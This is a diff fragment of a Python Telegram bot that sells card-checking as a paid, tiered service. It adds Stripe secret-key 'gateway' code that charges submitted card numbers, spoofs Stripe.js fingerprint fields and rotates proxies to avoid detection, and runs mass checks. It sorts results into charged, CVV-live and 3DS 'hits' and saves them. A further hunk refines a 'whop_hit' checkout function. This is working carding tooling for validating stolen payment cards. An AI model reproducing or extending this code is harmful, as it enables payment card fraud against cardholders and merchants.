+                    "gateway": "Stripe SK",
+                    "payment_intent_id": result_data.get('id')
+                }
+            elif status == 'requires_action':
+                return {
+                    "status": "success",
+                    "result": "3DS_REQUIRED",
+                    "message": "3D Secure required - Authentication needed",
+                    "status_display": "🔐 3D REQUIRED",
+                    "status_category": "approved",
+                    "elapsed": elapsed,
+                    "price": f"${amount:.2f}",
+                    "gateway": "Stripe SK"
+                }
+            elif status == 'requires_payment_method':
+                return {
+                    "status": "declined",
+                    "result": "DECLINED",
+                    "message": "Card was declined",
+                    "status_display": "❌ DECLINED",
+                    "status_category": "declined",
+                    "elapsed": elapsed,
+                    "price": f"${amount:.2f}",
+                    "gateway": "Stripe SK"
+                }
+            else:
+                return {
+                    "status": "unknown",
+                    "result": status,
+                    "message": f"Payment status: {status}",
+                    "status_display": f"⚠️ {status}",
+                    "status_category": "unknown",
+                    "elapsed": elapsed,
+                    "price": f"${amount:.2f}",
+                    "gateway": "Stripe SK"
+                }
+                
+    except httpx.TimeoutException:
+        print(f"⏰ [SK] Timeout error")
+        return {
+            "status": "error",
+            "result": "TIMEOUT",
+            "message": "Request timeout",
+            "status_display": "⚠️ TIMEOUT",
+            "status_category": "error",
+            "elapsed": time.time() - start_time,
+            "price": f"${amount:.2f}",
+            "gateway": "Stripe SK"
+        }
+    except Exception as e:
+        print(f"❌ [SK] Error: {e}")
+        traceback.print_exc()
+        return {
+            "status": "error",
+            "result": "ERROR",
+            "message": str(e)[:100],
+            "status_display": "⚠️ ERROR",
+            "status_category": "error",
+            "elapsed": time.time() - start_time,
+            "price": f"${amount:.2f}",
+            "gateway": "Stripe SK"
+        }
+
+
+# ============ ALTERNATIVE STRIPE.JS FLOW ============
+
+async def check_card_stripe_sk_stripejs(card: str, amount: float = 1.00,
+                                         currency: str = "USD", proxy: str = None,
+                                         user_id: int = None) -> Dict:
+    """
+    Alternative Stripe.js flow for tokenizing cards
+    Uses additional fingerprinting data for better success rate
+    """
+    print(f"\n{'='*80}")
+    print(f"💳 [STRIPE SK - Stripe.js Flow] Checking card: {card[:20]}...")
+    print(f"{'='*80}")
+    
+    start_time = time.time()
+    
+    try:
+        parts = card.split('|')
+        if len(parts) != 4:
+            return {
+                "status": "error",
+                "result": "INVALID_FORMAT",
+                "message": "Invalid card format",
+                "status_display": "⚠️ INVALID FORMAT",
+                "status_category": "error"
+            }
+        
+        card_num, exp_month, exp_year, cvc = parts
+        
+        if len(exp_year) == 2:
+            exp_year = f"20{exp_year}"
+        
+        # Configure client with proxy
+        client_kwargs = {
+            'timeout': httpx.Timeout(60.0, connect=15.0, read=50.0),
+            'verify': False,
+            'follow_redirects': True,
+        }
+        
+        if proxy:
+            proxy_url = format_proxy(proxy)
+            if proxy_url:
+                client_kwargs['proxy'] = proxy_url
+                print(f"🔧 Using proxy: {mask_proxy(proxy_url)}")
+        
+        # Headers
+        headers = {
+            'Authorization': f'Bearer {STRIPE_SK}',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': generate_user_agent(),
+            'Accept': 'application/json',
+        }
+        
+        # Generate fingerprint data
+        guid = generate_guid()
+        muid = generate_muid()
+        sid = generate_sid()
+        stripe_version = get_random_stripe_version()
+        elements_session_id = generate_elements_session_id()
+        
+        # ============ Create Payment Method ============
+        print(f"📡 [Stripe.js] Creating payment method...")
+        
+        pm_data = {
+            'type': 'card',
+            'card[number]': card_num,
+            'card[exp_month]': exp_month,
+            'card[exp_year]': exp_year,
+            'card[cvc]': cvc,
+            'guid': guid,
+            'muid': muid,
+            'sid': sid,
+            'payment_user_agent': f'stripe.js/{stripe_version}; stripe-js-v3/{stripe_version}; card-element',
+            'time_on_page': str(random.randint(5000, 30000)),
+            'referrer': 'https://js.stripe.com',
+            'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
+            'client_attribution_metadata[merchant_integration_source]': 'elements',
+            'client_attribution_metadata[merchant_integration_subtype]': 'card-element',
+            'client_attribution_metadata[merchant_integration_version]': '2021',
+            'client_attribution_metadata[elements_session_id]': elements_session_id,
+        }
+        
+        async with httpx.AsyncClient(**client_kwargs) as client:
+            response = await client.post(
+                'https://api.stripe.com/v1/payment_methods',
+                headers=headers,
+                data=pm_data
+            )
+            
+            print(f"📥 [Stripe.js] PM response: {response.status_code}")
+            
+            if response.status_code == 402:
+                try:
+                    error_data = response.json()
+                    return parse_stripe_error(error_data, time.time() - start_time, amount)
+                except:
+                    return {
+                        "status": "declined",
+                        "result": "DECLINED",
+                        "message": "Card declined",
+                        "status_display": "❌ DECLINED",
+                        "status_category": "declined",
+                        "elapsed": time.time() - start_time,
+                        "price": f"${amount:.2f}",
+                        "gateway": "Stripe SK"
+                    }
+            
+            if response.status_code != 200:
+                try:
+                    error_data = response.json()
+                    return parse_stripe_error(error_data, time.time() - start_time, amount)
+                except:
+                    return {
+                        "status": "declined",
+                        "result": "PM_FAILED",
+                        "message": f"HTTP {response.status_code}",
+                        "status_display": "❌ DECLINED",
+                        "status_category": "declined",
+                        "elapsed": time.time() - start_time,
+                        "price": f"${amount:.2f}",
+                        "gateway": "Stripe SK"
+                    }
+            
+            pm_result = response.json()
+            payment_method_id = pm_result.get('id')
+            
+            if not payment_method_id:
+                return {
+                    "status": "declined",
+                    "result": "NO_PM_ID",
+                    "message": "No payment method ID",
+                    "status_display": "❌ DECLINED",
+                    "status_category": "declined",
+                    "elapsed": time.time() - start_time,
+                    "price": f"${amount:.2f}",
+                    "gateway": "Stripe SK"
+                }
+            
+            print(f"✅ Payment method created: {payment_method_id}")
+            
+            # ============ Create Payment Intent ============
+            print(f"📡 [Stripe.js] Creating payment intent...")
+            
+            amount_cents = int(amount * 100)
+            
+            pi_data = {
+                'amount': str(amount_cents),
+                'currency': currency.lower(),
+                'payment_method': payment_method_id,
+                'confirmation_method': 'manual',
+                'confirm': 'false',
+                'return_url': 'https://example.com/success',
+            }
+            
+            pi_response = await client.post(
+                'https://api.stripe.com/v1/payment_intents',
+                headers=headers,
+                data=pi_data
+            )
+            
+            if pi_response.status_code != 200:
+                try:
+                    error_data = pi_response.json()
+                    return parse_stripe_error(error_data, time.time() - start_time, amount)
+                except:
+                    return {
+                        "status": "declined",
+                        "result": "PI_FAILED",
+                        "message": f"HTTP {pi_response.status_code}",
+                        "status_display": "❌ DECLINED",
+                        "status_category": "declined",
+                        "elapsed": time.time() - start_time,
+                        "price": f"${amount:.2f}",
+                        "gateway": "Stripe SK"
+                    }
+            
+            pi_result = pi_response.json()
+            pi_id = pi_result.get('id')
+            
+            if not pi_id:
+                return {
+                    "status": "declined",
+                    "result": "NO_PI",
+                    "message": "No payment intent",
+                    "status_display": "❌ DECLINED",
+                    "status_category": "declined",
+                    "elapsed": time.time() - start_time,
+                    "price": f"${amount:.2f}",
+                    "gateway": "Stripe SK"
+                }
+            
+            print(f"✅ Payment Intent created: {pi_id}")
+            
+            # ============ Confirm Payment ============
+            print(f"📡 [Stripe.js] Confirming payment...")
+            
+            confirm_data = {
+                'payment_method': payment_method_id,
+                'payment_method_data[allow_redisplay]': 'unspecified',
+            }
+            
+            confirm_response = await client.post(
+                f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm',
+                headers=headers,
+                data=confirm_data
+            )
+            
+            elapsed = time.time() - start_time
+            
+            if confirm_response.status_code != 200:
+                try:
+                    error_data = confirm_response.json()
+                    return parse_stripe_error(error_data, elapsed, amount)
+                except:
+                    return {
+                        "status": "declined",
+                        "result": "DECLINED",
+                        "message": f"HTTP {confirm_response.status_code}",
+                        "status_display": "❌ DECLINED",
+                        "status_category": "declined",
+                        "elapsed": elapsed,
+                        "price": f"${amount:.2f}",
+                        "gateway": "Stripe SK"
+                    }
+            
+            result_data = confirm_response.json()
+            status = result_data.get('status')
+            
+            if status == 'succeeded':
+                print(f"\n✅✅✅ PAYMENT SUCCESSFUL! Card charged ${amount:.2f} ✅✅✅")
+                return {
+                    "status": "success",
+                    "result": "CHARGED",
+                    "message": f"Payment successful - Card charged ${amount:.2f}",
+                    "status_display": "🔥 CHARGED 🔥",
+                    "status_category": "charged",
+                    "elapsed": elapsed,
+                    "price": f"${amount:.2f}",
+                    "gateway": "Stripe SK",
+                    "payment_intent_id": pi_id
+                }
+            elif status == 'requires_action':
+                return {
+                    "status": "success",
+                    "result": "3DS_REQUIRED",
+                    "message": "3D Secure required - Authentication needed",
+                    "status_display": "🔐 3D REQUIRED",
+                    "status_category": "approved",
+                    "elapsed": elapsed,
+                    "price": f"${amount:.2f}",
+                    "gateway": "Stripe SK"
+                }
+            else:
+                return {
+                    "status": "declined",
+                    "result": "DECLINED",
+                    "message": f"Payment status: {status}",
+                    "status_display": "❌ DECLINED",
+                    "status_category": "declined",
+                    "elapsed": elapsed,
+                    "price": f"${amount:.2f}",
+                    "gateway": "Stripe SK"
+                }
+                
+    except Exception as e:
+        print(f"❌ [Stripe.js] Error: {e}")
+        traceback.print_exc()
+        return {
+            "status": "error",
+            "result": "ERROR",
+            "message": str(e)[:100],
+            "status_display": "⚠️ ERROR",
+            "status_category": "error",
+            "elapsed": time.time() - start_time,
+            "price": f"${amount:.2f}",
+            "gateway": "Stripe SK"
+        }
+
+
+# ============ FORMAT RESPONSE ============
+
+def format_stripe_sk_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
+    """Format Stripe SK response for display with premium emojis"""
+    bin_info_text, bank, country, currency_code, country_code = bin_info
+    
+    status_display = result.get("status_display", "⚠️ UNKNOWN")
+    status_category = result.get("status_category", "unknown")
+    message = result.get("message", "Unknown")
+    elapsed = result.get("elapsed", 0)
+    gateway = result.get("gateway", "Stripe SK")
+    price = result.get("price", "$1.00")
+    pi_id = result.get("payment_intent_id", "")
+    
+    # Parse card for display
+    card_parts = card.split('|')
+    card_num = card_parts[0] if len(card_parts) > 0 else card
+    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
+    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
+    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
+    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+    
+    # Clean message
+    clean_message = message[:80] if message else "Unknown"
+    if len(message) > 80:
+        clean_message += "..."
+    
+    # Format country with flag
+    country_name = country.replace('🌐', '').strip()
+    flag_map = {
+        'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
+        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
+    }
+    country_flag = "🌍"
+    for key, flag in flag_map.items():
+        if key in country_name.upper():
+            country_flag = flag
+            break
+    
+    # Format bank name
+    bank_display = bank if bank and bank != 'N/A' else "Unknown"
+    if len(bank_display) > 25:
+        bank_display = bank_display[:22] + "..."
+    
+    # Determine emoji based on status
+    if "CHARGED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        status_text = "CHARGED"
+    elif "INSUFFICIENT" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+        status_text = "INSUFFICIENT FUNDS"
+    elif "CVV LIVE" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "CVV LIVE"
+    elif "3D" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
+        status_text = "3D REQUIRED"
+    elif "APPROVED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "APPROVED"
+    else:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        status_text = "DECLINED"
+    
+    # Build output
+    ui = (
+        f"┏━━━━━━━⍟\n"
+        f"┃ {status_emoji} {status_text}\n"
+        f"┗━━━━━━━━━━━⊛\n\n"
+        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv}</code>\n"
+        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
+        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
+        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
+        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
+        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
+        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
+        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
+    )
+    
+    if pi_id:
+        ui += f"\n[⌬] 𝐏𝐈 𝐈𝐃 ↣ {pi_id[:20]}..."
+    
+    return ui, status_category
+
+
+# ============ SINGLE CHECK COMMAND ============
+
+@check_gateway("stripe_sk")
+async def single_check_stripe_sk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Single card check with Stripe SK Key - /sk <card>
+    """
+    if not await verify_group_access(update, context):
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "💳 <b>Stripe SK Gateway</b>\n\n"
+            "Usage: <code>/sk &lt;card&gt;</code>\n"
+            "Example: <code>/sk 4242424242424242|12|2028|123</code>\n\n"
+            "💰 Amount: $1.00 (use /ch to change)\n"
+            "📍 Gateway: Stripe Direct (SK Key)\n"
+            "✅ Checks: Charged, CVV Live, Insufficient Funds, 3D Secure\n"
+            "🔐 Uses SK: <code>sk_live_...DNb0</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    card_text = " ".join(context.args).strip()
+    
+    # Extract card
+    card = card_formatter.extract_single_card_from_text(card_text)
+    if not card:
+        await message.reply_text(
+            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
+            "Example: 4242424242424242|12|2028|123"
+        )
+        return
+    
+    # Check credits
+    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    # Check gateway access
+    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
+        tier = user_manager.get_tier(user_id)
+        error_message = (
+            f"❌ <b>Stripe SK not available for {tier.upper()} tier</b>\n\n"
+            f"USE /buy TO UPGRADE YOUR TIER 💎"
+        )
+        await message.reply_text(error_message, parse_mode=ParseMode.HTML)
+        add_user_credits(user_id, 1)
+        return
+    
+    stripe_sk_active_tasks[user_id] = True
+    
+    try:
+        tier = user_manager.get_tier(user_id)
+        if user_id not in user_speed_controllers:
+            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[user_id]
+        
+        amount = float(context.user_data.get('payment_amount', DEFAULT_AMOUNT))
+        currency = context.user_data.get('payment_currency', DEFAULT_CURRENCY)
+        
+        status_msg = await message.reply_text(
+            f"{premium_emoji(PREMIUM_EMOJI_IDS['time'], '🔄')} Checking card with Stripe SK...",
+            parse_mode=ParseMode.HTML
+        )
+        
+        await speed_controller.wait_if_needed()
+        start = time.time()
+        
+        # Get proxy if allowed
+        proxy_str = None
+        if user_manager.can_use_proxy(user_id):
+            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
+                if proxy_list:
+                    proxy_str = proxy_list[0]
+                    print(f"🔌 [SK] Using proxy: {mask_proxy(proxy_str)}")
+        
+        result = await check_card_stripe_sk(card, amount, currency, proxy_str, user_id)
+        
+        elapsed = time.time() - start
+        speed_controller.record_response(elapsed)
+        
+        bin_info = await get_bin_info(card)
+        
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        
+        ui, status_category = format_stripe_sk_response(result, card, bin_info)
+        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+        
+        if status_category in ["charged", "approved"]:
+            await save_hit_to_file(
+                card=card, gateway="Stripe SK",
+                response=result.get("message", "Approved"),
+                price=f"${amount:.2f}",
+                bin_info=bin_info, user_id=user_id, user_tier=tier
+            )
+            
+            if status_category == "charged":
+                user_data = user_manager.get_user(user_id)
+                await send_hit_notification(
+                    context=context, gateway="Stripe SK", card=card,
+                    response=result.get("message", "Charged"),
+                    price=f"${amount:.2f}",
+                    user=user_data, bin_info=bin_info, status_category="charged"
+                )
+                user_manager.increment_hits(user_id)
+        
+        user_manager.increment_checks(user_id)
+        
+    except Exception as e:
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        print(f"❌ [SK] Error: {traceback.format_exc()}")
+        add_user_credits(user_id, 1)
+    finally:
+        stripe_sk_active_tasks.pop(user_id, None)
+
+
+# ============ MASS CHECK COMMAND ============
+
+@check_gateway("stripe_sk")
+async def mass_check_stripe_sk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Mass card check with Stripe SK Key - /msk <cards>
+    """
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    
+    if user_id in stripe_sk_active_tasks:
+        await message.reply_text(
+            "⚠️ You already have an active Stripe SK session.\n"
+            "Please wait for it to finish or use /stop to cancel.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Stripe SK not available for {tier.upper()} tier.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
+            f"Use /sk for single checks.\n"
+            f"💎 Upgrade to Premium/Ultimate for mass checks.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    # Check if reply to file
+    if message.reply_to_message and message.reply_to_message.document:
+        try:
+            file = await message.reply_to_message.document.get_file()
+            content = await file.download_as_bytearray()
+            content = content.decode('utf-8', errors='ignore')
+            
+            cards = []
+            for line in content.splitlines():
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    card = card_formatter.extract_single_card_from_text(line)
+                    if card:
+                        cards.append(card)
+            
+            if not cards:
+                await message.reply_text("❌ No valid cards found in file.")
+                return
+                
+            await message.delete()
+            await mass_check_stripe_sk_logic(update, context, cards, None)
+            return
+            
+        except Exception as e:
+            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
+            return
+    
+    # Handle direct text input
+    if not context.args:
+        await message.reply_text(
+            "📦 <b>Stripe SK Mass Check</b>\n\n"
+            "Usage: <code>/msk &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "Or reply to a .txt file with /msk\n\n"
+            "Example: <code>/msk 4242424242424242|12|2028|123 4222222222222222|11|2026|456</code>\n\n"
+            "💰 Amount: $1.00 (use /ch to change)\n"
+            "📍 Gateway: Stripe Direct (SK Key)\n"
+            "✅ Only charged/approved cards will be shown",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    cards_text = " ".join(context.args)
+    card_strings = cards_text.split()
+    
+    cards = []
+    for card_str in card_strings:
+        card = card_formatter.extract_single_card_from_text(card_str)
+        if card:
+            cards.append(card)
+    
+    if not cards:
+        await message.reply_text("❌ No valid cards found.")
+        return
+    
+    # Check batch size limit
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating.")
+    
+    # Check credits for mass check
+    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    try:
+        await message.delete()
+    except:
+        pass
+    
+    await mass_check_stripe_sk_logic(update, context, cards, None)
+
+
+# ============ MASS CHECK LOGIC ============
+
+async def mass_check_stripe_sk_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, 
+                                      cards: list, progress_msg=None):
+    """
+    Mass check logic for Stripe SK gateway
+    """
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+    
+    print(f"\n{'='*80}")
+    print(f"🚀 [STRIPE SK MASS CHECK] Starting batch for user {u_id}")
+    print(f"📊 Total cards: {total}")
+    print(f"{'='*80}")
+    
+    # Get user's working proxies
+    user_proxies = []
+    if user_manager.can_use_proxy(u_id):
+        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
+            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
+            print(f"🔌 Found {len(user_proxies)} working proxies for rotation")
+    
+    amount = float(context.user_data.get('payment_amount', DEFAULT_AMOUNT))
+    currency = context.user_data.get('payment_currency', DEFAULT_CURRENCY)
+    
+    stats = {
+        "charged": 0,
+        "approved": 0,
+        "declined": 0,
+        "errors": 0,
+        "total": total,
+        "processed": 0
+    }
+    
+    start_time = time.time()
+    proxy_index = 0
+    
+    try:
+        stripe_sk_active_tasks[u_id] = True
+        
+        tier = user_manager.get_tier(u_id)
+        
+        CONCURRENCY = {
+            "free": 2,
+            "premium": 5,
+            "ultimate": 10,
+            "admin": 15,
+        }.get(tier, 2)
+        
+        charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
+        
+        if progress_msg is None:
+            progress_text = (
+                f"<b>Gateway</b> ➛ Stripe SK\n"
+                f"<b>Status</b> ➛ STARTING...\n"
+                f"<b>Checked</b> ➛ 0/{total}\n"
+                f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
+                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
+                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
+                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+                f"<b>Time</b> ➛ 0s"
+            )
+            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
+        
+        if u_id not in user_speed_controllers:
+            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[u_id]
+        
+        semaphore = asyncio.Semaphore(CONCURRENCY)
+        stats_lock = asyncio.Lock()
+        processed_count = 0
+        
+        async def update_progress(current: int):
+            if current > 0 and current < total and current % 10 != 0:
+                return
+            elapsed = int(time.time() - start_time)
+            minutes = elapsed // 60
+            seconds = elapsed % 60
+            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
+            
+            if current >= total:
+                status_text = "FINISHED ✅"
+            else:
+                status_text = f"PROCESSING {current}/{total}"
+            
+            progress_text = (
+                f"<b>Gateway</b> ➛ Stripe SK\n"
+                f"<b>Status</b> ➛ {status_text}\n"
+                f"<b>Checked</b> ➛ {current}/{total}\n"
+                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
+                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
+                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
+                f"<b>Time</b> ➛ {time_str}"
+            )
+            try:
+                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
+            except:
+                pass
+        
+        async def process_single_card(card: str, idx: int):
+            nonlocal processed_count, proxy_index
+            
+            await asyncio.sleep(random.uniform(0.1, 0.3))
+            
+            async with semaphore:
+                await speed_controller.wait_if_needed()
+                start = time.time()
+                
+                # Get proxy for this card
+                proxy_str = None
+                if user_proxies:
+                    proxy_str = user_proxies[proxy_index % len(user_proxies)]
+                    proxy_index += 1
+                
+                result = await check_card_stripe_sk(card, amount, currency, proxy_str, u_id)
+                elapsed = time.time() - start
+                speed_controller.record_response(elapsed)
+                
+                bin_info = await get_bin_info(card)
+                status_category = result.get("status_category", "unknown")
+                
+                async with stats_lock:
+                    processed_count += 1
+                    
+                    if status_category == "charged":
+                        stats["charged"] += 1
+                        stats["approved"] += 1
+                        print(f"🔥 [CHARGED] {card[:20]}...")
+                    elif status_category == "approved":
+                        stats["approved"] += 1
+                        print(f"✅ [APPROVED] {card[:20]}...")
+                    elif status_category == "declined":
+                        stats["declined"] += 1
+                        print(f"❌ [DECLINED - HIDDEN] {card[:20]}...")
+                    else:
+                        stats["errors"] += 1
+                        print(f"⚠️ [ERROR] {card[:20]}...")
+                    
+                    if processed_count % 10 == 0 or processed_count == total:
+                        await update_progress(processed_count)
+                
+                # ONLY SEND RESULT FOR CHARGED OR APPROVED CARDS
+                if status_category in ["charged", "approved"]:
+                    ui, _ = format_stripe_sk_response(result, card, bin_info)
+                    try:
+                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                        print(f"📤 [SENT] {card[:20]}...")
+                    except:
+                        pass
+                    
+                    await save_hit_to_file(
+                        card=card, gateway="Stripe SK",
+                        response=result.get("message", "Approved"),
+                        price=f"${amount:.2f}",
+                        bin_info=bin_info, user_id=u_id, user_tier=tier
+                    )
+                    
+                    if status_category == "charged":
+                        user_data = user_manager.get_user(u_id)
+                        await send_hit_notification(
+                            context=context, gateway="Stripe SK", card=card,
+                            response=result.get("message", "Charged"),
+                            price=f"${amount:.2f}",
+                            user=user_data, bin_info=bin_info, status_category="charged"
+                        )
+                        user_manager.increment_hits(u_id)
+                
+                user_manager.increment_checks(u_id, 1)
+                return result, card
+        
+        # Process all cards
+        tasks = [process_single_card(card, idx) for idx, card in enumerate(cards)]
+        
+        for coro in asyncio.as_completed(tasks):
+            if u_id not in stripe_sk_active_tasks:
+                break
+            try:
+                await coro
+            except Exception as e:
+                print(f"❌ Task error: {e}")
+                async with stats_lock:
+                    stats["errors"] += 1
+        
+        # Final summary
+        if u_id in stripe_sk_active_tasks:
+            total_time = time.time() - start_time
+            minutes = int(total_time // 60)
+            seconds = int(total_time % 60)
+            
+            skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
+            
+            summary = (
+                f"{skull_emoji} <b>Stripe SK Mass Check Complete</b>\n\n"
+                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
+                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
+                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} (Hidden)\n"
+                f"{errors_emoji} <b>Errors</b> ➛ {stats['errors']}\n"
+                f"📝 <b>Total</b> ➛ {total}\n"
+                f"⏱️ <b>Time</b> ➛ {minutes}m {seconds}s\n"
+                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
+            )
+            
+            await update_progress(total)
+            await message.reply_text(summary, parse_mode=ParseMode.HTML)
+            print(f"📊 Final summary sent to user {u_id}")
+        
+        return stats
+        
+    except Exception as e:
+        print(f"❌ Stripe SK mass check error: {e}")
+        traceback.print_exc()
+        try:
+            if progress_msg:
+                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+        except:
+            pass
+    finally:
+        stripe_sk_active_tasks.pop(u_id, None)
+        print(f"🏁 [Stripe SK Mass] Session ended for user {u_id}")
+
+
+
+ 
+ 
     
 #STC1
 async def check_card_stc1(card: str, proxy: str = None) -> Dict:
@@ -60988,11 +62295,9 @@ async def whop_poll_status(session_id: str, client_secret: str, cookie: str,
     
     return {"final": "TIMEOUT", "message": "Payment processing timeout", "data": {}}
 
-# ============ MAIN WHOP HIT FUNCTION ============
 
-# ============ FIXED WHOP HIT FUNCTION - PROPERLY DETECTS 3DS ============
 
-# ============ FIXED WHOP_HIT - BETTER 3DS DETECTION ============
+# ============ FIXED WHOP_HIT - BETTER POLLING ============
 
 async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
     t0 = time.time()
@@ -61084,7 +62389,6 @@ async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
         full_message = f"{err_msg} {str(confirm)} {pay_stat}".lower()
 
         # ============ CHECK FOR 3DS FIRST ============
-        # If payment requires action, it's 3DS
         if pay_stat == "requires_action" or status == "requires_action":
             print(f"🔐 [WHOP] 3DS REQUIRED detected!")
             out["status"] = "3DS_REQUIRED"
@@ -61107,36 +62411,51 @@ async def whop_hit(checkout_url: str, card_str: str, proxy: str = None) -> Dict:
             out["elapsed"] = round(time.time() - t0, 2)
             return out
 
-        # Check for CVV live
-        if pay_stat == "processing" and not last_err:
+        # ============ FIXED: Poll for final status ============
+        if pay_stat == "processing":
             print("⏳ Payment in processing, polling for final status...")
-            poll = await whop_poll_status(session_id, client_secret, cookie, proxy)
-            out["steps"]["poll"] = poll
+            poll_result = await whop_poll_status(session_id, client_secret, cookie, proxy)
+            out["steps"]["poll"] = poll_result
             
-            poll_status = poll.get("final", "")
-            poll_data = poll.get("data", {})
+            # ============ SAFELY CHECK POLL RESULT ============
+            if poll_result is None:
+                print("⚠️ Poll returned None")
+                out["status"] = "ERROR"
+                out["message"] = "Polling returned None"
+                out["elapsed"] = round(time.time() - t0, 2)
+                return out
+            
+            poll_status = poll_result.get("final", "")
+            poll_data = poll_result.get("data", {})
+            
+            # If poll_data is None, use empty dict
+            if poll_data is None:
+                poll_data = {}
+            
             poll_payment = poll_data.get("payment", {})
+            if poll_payment is None:
+                poll_payment = {}
+            
             poll_pay_stat = poll_payment.get("status", "")
             
-            # ============ FIX: Check poll result for 3DS ============
+            # ============ CHECK POLL RESULT ============
             if poll_pay_stat == "requires_action" or poll_status == "3DS_REQUIRED":
                 out["status"] = "3DS_REQUIRED"
                 out["message"] = "3D Secure required - Authentication needed"
